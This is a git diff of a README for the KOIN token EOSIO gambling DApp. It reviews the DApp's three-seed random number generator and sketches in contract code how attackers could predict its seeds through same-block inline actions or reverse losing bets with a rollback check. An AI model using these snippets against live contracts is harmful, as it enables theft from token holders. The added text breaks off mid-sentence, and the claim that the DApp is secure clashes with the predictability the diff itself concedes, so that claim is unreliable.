@@ -18,7 +18,7 @@ visit us: <a href="https://koin4dapp.appspot.com"> koin4dapp</a>
 Our decentralized random number generators(DRNG) bring fairness and tamper-resistance in the process of generating numbers to ensure fair game to all members. To Ensure the fairness our DRNG using 3 random number seeds. The first seed is from previous session seed saved at our DApp, the second seed is generated from current transaction ID, and the third seed is currently executing transaction block number. So there are no Founder intervention, and all is happened automatically at the blockchain based on DApp algorithm. The code snippet:
 
 ```
-void init(uint64_t initseed) { //first seed=previous session seed saved at DApp
+void init(uint64_t initseed) { //first seed=previous session seed saved at DApp + secret formula
   auto s = read_transaction(nullptr,0);
   char *tx = (char *)malloc(s);
   read_transaction(tx, s);
@@ -125,9 +125,9 @@ uint32_t rand(uint32_t to) { //generate random 1 - to range
 ```
 
 <h3>Possibility of 3SDRNG Attack</h3>
-KOIN token is player to player community DApp, so that we must make sure that 3SDRNG is secure from the attacker can cause loss to all KOIN token holder. The key of target attack is in the three seeds. The basic technique to attack an DApp is using RPC API Call, but this approach will not work on our DApp, because there are no way to read previous session seed table which isn't add to the ABI file, so the attacker must write smart contract to attack our DApp.
+KOIN token is player to player community DApp, so that we must make sure that is secure from the attacker which can cause loss to all KOIN token holder, but because the execution of a smart contract in blockchain must be deterministic to keep the consensus, the attackers can take benefit from this behaviour, they can create a smart contract that call our smart contract as an action, so they run in a same block and share the same deterministic parameter values like transaction ID, tapos_block_prefix() and tapos_block_num().
 
-To attack our last session seed, attacker would typically create a struct and typedef similar to our singleton table and read it using the same code and scope as our DApp. The code snipped to read from table that are not added to the ABI file is:
+To attack our last session seed, attacker would typically create a struct and typedef similar to our singleton table and read it using the same code and scope as our DApp. The code snipped to read value from a table that are not added to the ABI file is:
 
 ```
 struct similarobj {
@@ -140,7 +140,8 @@ auto db = targetobj("targetcode"_n,name("targetscope").value);
 auto seed1 = db.get();
 ...
 ```
-To attack transaction Id, attacker must generated packed_trx and convert it to transaction ID using sha256. The code snipped to read current transaction structure from memory and convert to transaction ID:
+
+To attack transaction Id, at first we must understand how eosio generate transaction ID. Transaction ID is generated using hash  of current packed_trx in memory. The code snipped to print transaction ID in a smart contract is:
 
 ```
 auto s = read_transaction(nullptr,0);
@@ -151,101 +152,30 @@ capi_checksum256 result; //32bytes of 8 chunks of uint_32
 sha256(tx,s, &result);
 printhex(&result, sizeof(result)); //transaction ID
 ```
-Suppose the result of packed_trx is "265cfe5c51212756d49f00000000013044c82a46c387080040768bde9ab1ca013044c82a46c3870800000000a8ed3232101027000000000000045349530000000000", then and the unpacked result using cleos command is:
+
+If a smart contract issue several inline actions (not deffered one), then all of the actions will run as a transaction, so they share the same parameter values. The code snipped is:
 
 ```
-cleos convert unpack_transaction '{
-  "compression": "none",
-  "packed_context_free_data": "",
-  "packed_trx": "265cfe5c51212756d49f00000000013044c82a46c387080040768bde9ab1ca013044c82a46c3870800000000a8ed3232101027000000000000045349530000000000"}'
-```
+auto s = read_transaction(nullptr,0);
+char *tx = (char *)malloc(s);
+read_transaction(tx, s);
+printhex(tx,s); //packed_trx
+capi_checksum256 seed2; //32bytes of 8 chunks of uint_32
+sha256(tx,s, &seed2);
+printhex(&seed2, sizeof(seed2)); //transaction ID
 
-And the JSON result is:
-```
-{
-  "expiration": "2019-06-10T13:33:26",
-  "ref_block_num": 8529,
-  "ref_block_prefix": 2681493031,
-  "max_net_usage_words": 0,
-  "max_cpu_usage_ms": 0,
-  "delay_sec": 0,
-  "context_free_actions": [],
-  "actions": [{
-      "account": "targetcontract",
-      "name": "smartprofit",
-      "authorization": [{
-          "actor": "youraccount",
-          "permission": "active"
-        }
-      ],
-      "data": "10270000000000000453495300000000"
-    }
-  ],
-  "transaction_extensions": [],
-  "signatures": [],
-  "context_free_data": []
-}
-
-```
-Attacker can get ref_block_num and ref_block_prefix using  /v1/chain/get_info RPC API Call with the code snipped is:
-
-```
-<html>
-<script>
-var data = null;
-
-var xhr = new XMLHttpRequest();
-
-xhr.addEventListener("readystatechange", function () {
-  if (this.readyState === this.DONE) {
-    console.log(this.responseText);
-  }
-});
-
-xhr.open("POST", "https://endpoint/v1/chain/get_info");
-xhr.setRequestHeader("accept", "application/json");
-xhr.setRequestHeader("content-type", "application/json");
-
-xhr.send(data);
-</script>
-</html>
-```
-Where ref_block_num = last_irreversible_block_num, ref_block_prefix = head_block_num.
-```
-{
-  "server_version": "de643ec0",
-  "chain_id": "d5a3d18fbb3c084e3b1f3fa98c21014b5f3db536cc15d08f9f6479517c6a3d86",
-  "head_block_num": 24537585,
-  "last_irreversible_block_num": 24537255,
-  "last_irreversible_block_id": "017668a79c7f887b45b59fca389cbcb14f3f7afb0fa5d09ac4ac1a1b91b13e83",
-  "head_block_id": "017669f10670ff45e9a99212f7e2cb090c418d00eea41fecfe4fd37318484c2a",
-  "head_block_time": "2019-06-08T13:45:44.500",
-  "head_block_producer": "producer",
-  "virtual_block_cpu_limit": 200000000,
-  "virtual_block_net_limit": 1048576000,
-  "block_cpu_limit": 199900,
-  "block_net_limit": 1048576,
-  "server_version_string": "v2.0.3"
-}
-```
-
-To attack tapos_block_prefix() and tapos_block_num(), attacker must make sure that their smart contract and transaction initialize to our DAPP are run on the same block, otherwise the two numbers will be changed and the result is different. The code snipped to get tapos_block_prefix() and tapos_block_num(), then initialize action to our DAPP to make sure they run on the same block. The code snipped is:
-
-```
-auto seed2 = tapos_block_prefix() * tapos_block_num();
+auto seed3 = tapos_block_prefix() * tapos_block_num();
   ...
   ...
 action(
   permission_level{_self, "active"_n,
   "targetcontract"_n, "targetaction"_n),
   std::make_tuple(_self, other params need by action)
-.send(); 
+.send(); //the target action will have same transaction ID, tapos_block_perfix() and tapos_block_num()
 ```
 
-(Source: https://bzdww.com/article/130403/, last access 8 June 2019)
-
-<h1>Possibility of Rollback Attack</h3>
-In our DApp process we have make sure avoiding Rollback Attack. In rollback attack technique, attacker can make a smart contract that compare balance before and after action to play game, then rollback the transaction using eosio_assert if ending balance < begining balance. The code snipped is:
+<h1>Possibility of Rollback Attack</h1>
+In our DApp process we have to make sure avoiding Rollback Attack. In rollback attack technique, attacker can make a smart contract that compare balance before and after action to play game, then rollback the transaction using eosio_assert if ending balance < begining balance. The code snipped is:
 
 ```
 void token::checkbalance(asset bbalance)
@@ -283,6 +213,10 @@ void token::smartprofit( asset value)
   ).send();
 }
 ```
+<h1>Attack Prevention</h1>
+It is impossible to create a totally secret random number if we have revealed it as open source , because the execution of smart contracts must be deterministic to keep the consensus. The attacker can duplicate your algorithm and calculate the result and run your smart contract using action, so they run in a same block, and all the parameters are deterministic.
+So we can't open all of our source code, we 
+
 
 <h3>Conclusion</h3>
-So far, we can make conclusion that our 3SDRNG and process in our DApp are secure and ensure fairness to all members. If there are possible to attack our DApp, but they are hard to do in the smart contract. Attacker must initial packed_trx similar to current running transaction in memory packed_trx and must make sure that they run on the same block.
+So far, we can make conclusion that our 3SDRNG and process in our DApp are secure and we ensure fairness to all members. If there are possible to attack our DApp,
